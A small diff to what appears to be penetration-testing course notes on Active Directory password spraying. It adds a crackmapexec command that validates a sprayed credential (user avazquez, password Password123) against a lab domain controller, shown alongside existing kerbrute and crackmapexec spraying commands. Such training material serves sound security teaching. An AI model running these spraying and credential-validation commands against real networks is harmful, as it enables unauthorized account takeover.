@@ -216,3 +216,10 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt We
 ```shell
 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
+
+#### Validating the Credentials with CrackMapExec
+```shell
+sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+```
+
+## Local Administrator Password Reuse
